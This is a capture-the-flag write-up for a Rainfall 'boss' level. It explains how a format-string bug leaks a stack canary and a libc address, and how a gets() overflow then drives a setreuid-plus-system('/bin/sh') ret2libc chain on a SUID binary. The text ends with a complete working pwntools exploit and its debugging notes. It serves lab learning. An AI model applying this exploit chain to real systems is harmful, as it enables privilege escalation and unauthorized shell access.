# Level10 — Rainfall (Boss Fight)

Full ret2libc under **NX + stack canary + ASLR**: leak the canary and a libc
pointer with a format string, rebuild libc at runtime, then overflow into a
`setreuid + system("/bin/sh")` chain to pop a shell as `flag10` and read the pass.

```
Vulns:   format-string (info leak) + gets() stack overflow
Defeats: canary (leaked), ASLR (leaked libc), NX (ret2libc)
Goal:    shell as flag10  ->  cat /home/flag10/.pass
```

---

## 1. The binary

`tessier` is a SUID binary owned by `flag10`. When `level10` runs it, the process
has **ruid = level10, euid = flag10** — that split matters later.

```
$ checksec tessier
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found          <- can't blindly smash the return address
    NX:       NX enabled            <- no shellcode on the stack; must reuse code (ret2libc)
    PIE:      No PIE (0x400000)      <- the binary itself is at a fixed address
    SHSTK/IBT: Enabled              <- CET; our plain ret2libc into libc gadgets is unaffected
```

ASLR is on at the OS level, so **libc moves every run** even though the binary
doesn't. That's the protection the leak exists to defeat.

### Flow (`main`)

```
init_vault() -> init_sessions() -> print_banner() -> format_log() -> authenticate()
```

Two functions are exploitable:

- **`format_log()`** — our information leak.
- **`authenticate()`** — our control-flow hijack.

---

## 2. Vulnerability #1 — format string (the leak)

```c
void format_log(void) {
    char buf[32];
    ...
    fgets(buf, 0x20, stdin);
    ...
    printf(buf);          // <-- user-controlled format string
    putchar('\n');
}
```

`printf(buf)` passes attacker input straight as the format string. With `%p`
conversions we read values off the stack. Two of those slots are gold:

| Specifier | What it leaks        | Why it's there                                  |
|-----------|----------------------|-------------------------------------------------|
| `%11$p`   | the **stack canary** | `buf` sits at `rbp-0x30`, canary at `rbp-0x08`  |
| `%17$p`   | a **libc address**   | `main`'s return address into `__libc_start_main`|

`fgets` only allows 31 bytes, but `%11$p|%17$p` fits easily and gets both in one shot.

> Slot numbers can shift by one stray push between builds. Confirm with a probe —
> the canary always ends in `00`, the libc value is the `0x7f...` one:
> ```python
> p.sendline(b"%11$p.%16$p.%17$p")   # inspect which is canary / stack / libc
> ```

## 3. Vulnerability #2 — `gets()` overflow (the hijack)

```c
void authenticate(void) {
    char input_buf[64];
    ...
    gets(input_buf);      // <-- unbounded read, classic stack overflow
    ...
}
```

`gets()` has no length limit, so we overflow `input_buf` and overwrite the saved
return address — **but** the canary sits between the buffer and the return
address, so we must write the *correct* canary back or `__stack_chk_fail` aborts
before the function returns. That's exactly why we leaked it in step 2.

### Stack layout of `authenticate` (from the disassembly)

```
rbp-0x50  input_buf[64]      <- gets() writes here
   ...
rbp-0x08  canary
rbp+0x00  saved rbp
rbp+0x08  return address     <- hijack target
```

Padding from `input_buf` to the canary = `0x50 - 0x08 = 0x48 = 72 bytes`.

So the payload is:

```
[ 72 bytes padding ][ leaked canary (8) ][ saved rbp (8) ][ ROP chain ]
```

---

## 4. Why ret2libc, and why `setreuid` first

NX means we can't run shellcode on the stack, so we reuse existing code —
`system("/bin/sh")` inside libc. But there's a privilege trap:

The binary is SUID, so `euid = flag10` while `ruid = level10`. Modern `/bin/sh`
(dash) **drops privileges when `euid != ruid`**, so a bare `system("/bin/sh")`
would hand us a shell as `level10` — useless.

Fix: call `setreuid(flag10_uid, flag10_uid)` first so `ruid == euid == flag10`,
then the shell keeps the privileges.

```
$ grep flag10 /etc/passwd
flag10:x:1027:1029::/home/flag10:/usr/sbin/nologin   ->  OWNER_UID = 1027
```

Chain:

```
setreuid(1027, 1027)   ->   system("/bin/sh")
```

---

## 5. The gotcha that cost us — stack alignment

With the canary, offset, and libc base all correct, the exploit still
**SIGSEGV'd deterministically** right after the chain started.

Cause: glibc's `system()` executes a `movaps` instruction that **requires `rsp`
to be 16-byte aligned**. A function entered via a `ret` is only aligned correctly
if the number of 8-byte words in the chain leaves `rsp` at the right parity when
`system` is entered. Ours was off by 8.

Fix: insert (or remove) **exactly one** `ret` gadget before `system` to flip the
parity.

```python
rop.setreuid(1027, 1027)
# rop.raw(rop.ret)      # <-- one bare `ret` toggles 16-byte alignment for system()
rop.system(binsh)
```

**Rule of thumb:** if the chain crashes *inside* `system` with everything else
confirmed, toggle this single `ret`. There are only two parities — one of them is
correct. On this VM, **no extra `ret`** was the aligned one. (The right choice can
differ between machines because pwntools versions pick different `pop rsi`
gadgets, which changes the word count.)

---

## 6. Step-by-step recap

1. **Leak** — in `format_log`, send `%11$p|%17$p`; parse the canary and a libc pointer.
2. **Rebase libc** — `libc.address = libc_leak - libc.libc_start_main_return`; assert it's page-aligned (`& 0xfff == 0`).
3. **Build chain** — `setreuid(1027,1027)` then `system("/bin/sh")`, resolved against the rebased libc, with `badchars=b'\n'` (because `gets` stops at `0x0a`).
4. **Align** — add/remove one `ret` so `system` enters 16-byte aligned.
5. **Overflow** — in `authenticate`, send `72*b'\x00' + canary + p64(0) + chain`.
6. **Shell** — `cat /home/flag10/.pass`.

---

## 7. Running it

```sh
level10@rainfall:~$ python3 exploit.py
[*] libc base = 0x7ffff7c00000
[*] Switching to interactive mode
[T-A] Access denied. Session 0 terminated.     # authenticate's else-branch, harmless
$ id
uid=1027(flag10) ...
$ cat /home/flag10/.pass
<flag>
```

The recovered flag goes in `level10/flag`; the script lives in `level10/resources/exploit.py`.

---

## 8. Debugging checklist (symptom -> cause)

| Symptom                                   | Cause                                             |
|-------------------------------------------|---------------------------------------------------|
| `base not page-aligned` assert fails      | wrong `%N$p` slot for the libc leak — re-probe     |
| Python `ValueError` on the split          | leak parsing — check the `recvuntil`/delimiter     |
| SIGSEGV, everything else confirmed        | **stack alignment** — toggle the single `ret`      |
| Shell opens but `cat` says *Permission denied* | wrong `OWNER_UID`, or `setreuid` missing/skipped |
| Works ~97% of runs, random crashes        | leaked canary contained `0x0a`; `gets` truncated — just rerun |

---

## 9. Full exploit

```python
from pwn import *

context.arch = 'amd64'
context.log_level = 'info'

libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')   # path from `ldd tessier`
OWNER_UID = 1027                                 # flag10, from /etc/passwd

p = process('/home/level10/tessier', env={})

# 1. leak canary (%11$p) + libc pointer (%17$p) in one format-string shot
p.recvuntil(b"[T-A] Session tag: ")
p.sendline(b"%11$p|%17$p")
p.recvuntil(b"[T-A] Tag accepted: ")
canary_hex, libc_hex = p.recvline().strip().split(b"|")
canary    = int(canary_hex, 16)
libc_leak = int(libc_hex, 16)

# 2. rebuild libc base from the leak (beats ASLR)
libc.address = libc_leak - libc.libc_start_main_return
assert libc.address & 0xfff == 0, f"base not page-aligned: {libc.address:#x}"
log.info("canary    = %#x", canary)
log.info("libc base = %#x", libc.address)

# 3. ret2libc chain: setreuid(flag10,flag10) -> system("/bin/sh")
rop = ROP(libc, badchars=b'\n')
rop.setreuid(OWNER_UID, OWNER_UID)
# 4. alignment: add `rop.raw(rop.ret)` here only if system() SIGSEGVs on movaps
rop.system(next(libc.search(b'/bin/sh\x00')))

# 5. overflow authenticate(): 72 pad + canary + saved rbp + chain
payload = b'\x00' * 72 + p64(canary) + p64(0) + rop.chain()

p.recvuntil(b"[T-A] Authentication token: ")
p.sendline(payload)
p.interactive()
```
